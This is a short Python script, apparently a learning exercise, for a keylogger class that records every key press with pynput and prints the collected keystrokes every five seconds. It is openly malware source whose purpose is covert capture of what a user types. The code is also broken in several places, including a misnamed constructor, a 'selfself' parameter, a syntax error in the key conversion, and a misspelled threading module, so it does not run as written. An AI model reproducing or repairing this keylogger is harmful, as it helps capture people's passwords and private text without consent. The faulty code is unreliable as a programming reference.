#!/usr/bin/env python
import pynput.keyboard
import threading

class Keylogger:
    def _init_(self):
        self.log = ""

    def append_to_log(selfself, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(self, key):
        except AttributeError:
            if key == key.space:
                current_key = ""
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threaing.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()